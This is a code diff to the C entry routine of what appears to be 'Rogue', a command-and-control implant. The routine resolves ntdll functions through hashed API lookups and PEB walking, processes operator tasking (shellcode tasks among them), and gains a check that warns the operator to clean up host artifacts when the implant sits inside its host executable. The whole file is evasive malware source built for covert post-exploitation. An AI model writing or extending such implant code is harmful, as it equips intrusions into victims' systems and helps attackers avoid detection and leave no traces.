@@ -12,11 +12,13 @@
 
 typedef struct
 {
+	D_API( NtQueryVirtualMemory );
 	D_API( RtlAllocateHeap );
 	D_API( RtlFreeHeap );
 } API ;
 
 /* API Hashes */
+#define H_API_NTQUERYVIRTUALMEMORY	0x10c0e85d /* NtQueryVirtualMemory */
 #define H_API_RTLALLOCATEHEAP		0x3be94c5a /* RtlAllocateHeap */
 #define H_API_RTLFREEHEAP		0x73a9e4d7 /* RtlFreeHeap */
 
@@ -34,21 +36,24 @@ typedef struct
 !*/
 D_SEC( B ) VOID WINAPI Entry( VOID )
 {
-	API		Api;
+	API				Api;
+	MEMORY_BASIC_INFORMATION	Mbi;
 
-	BOOL		Rcv = FALSE;
-	DWORD		Res = 0;
-	PBUFFER		Inb = NULL;
-	PBUFFER		Onb = NULL;
-	PROGUE_CTX	Ctx = NULL;
-	PTASK_REQ_HDR	Req = NULL;
-	PTASK_RET_HDR	Ret = NULL;
+	BOOL				Rcv = FALSE;
+	DWORD				Res = 0;
+	PBUFFER				Inb = NULL;
+	PBUFFER				Onb = NULL;
+	PROGUE_CTX			Ctx = NULL;
+	PTASK_REQ_HDR			Req = NULL;
+	PTASK_RET_HDR			Ret = NULL;
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
+	RtlSecureZeroMemory( &Mbi, sizeof( Mbi ) );
 
-	Api.RtlAllocateHeap = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
-	Api.RtlFreeHeap     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
+	Api.NtQueryVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYVIRTUALMEMORY ); 
+	Api.RtlAllocateHeap      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
+	Api.RtlFreeHeap          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
 
 	/* Create a buffer to hold the rogue context */
 	if ( ( Ctx = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( ROGUE_CTX ) ) ) != NULL ) {
@@ -68,7 +73,7 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 					/* Set return buffer header */
 					Ret = C_PTR( U_PTR( Onb->Buffer ) + sizeof( Ctx->Id ) );
 					Ret->TaskId     = 0;
-					Ret->CallbackId = 0;
+					Ret->CallbackId = NoAction;
 					Ret->ReturnCode = 0;
 					Ret->ErrorValue = 0;
 
@@ -131,6 +136,16 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 													Ret->ReturnCode = 0;
 													Ret->ErrorValue = 0;
 
+													/* Query Information about the current address space */
+													if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( G_PTR( Entry ) ), MemoryBasicInformation, &Mbi, sizeof( Mbi ), NULL ) ) ) {
+														/* Is the same address region? */
+														if ( U_PTR( NtCurrentPeb()->ImageBaseAddress ) == U_PTR( Mbi.AllocationBase ) ) {
+															/* Print a status message */
+															RoguePrintf( Ctx, C_PTR( G_PTR( "Rogue is within the process host PE, and will not free itself." ) ) );
+															RoguePrintf( Ctx, C_PTR( G_PTR( "Please ensure that you are cleaning up your host artifacts." ) ) );
+														};
+													};
+
 													/* Abort */
 													break;
 												case ShellcodeTask:
@@ -180,4 +195,5 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
+	RtlSecureZeroMemory( &Mbi, sizeof( Mbi ) );
 };
